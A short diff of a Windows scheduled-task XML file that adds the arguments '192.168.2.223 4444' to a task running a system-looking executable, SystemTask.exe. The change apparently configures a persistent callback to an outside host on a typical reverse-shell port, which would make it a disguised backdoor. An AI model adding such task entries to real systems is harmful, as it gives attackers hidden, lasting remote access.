@@ -39,6 +39,7 @@
   <Actions Context="Author">
     <Exec>
       <Command>C:\Windows\System32\SystemTask.exe</Command>
+      <Arguments>192.168.2.223 4444</Arguments>
     </Exec>
   </Actions>
 </Task>
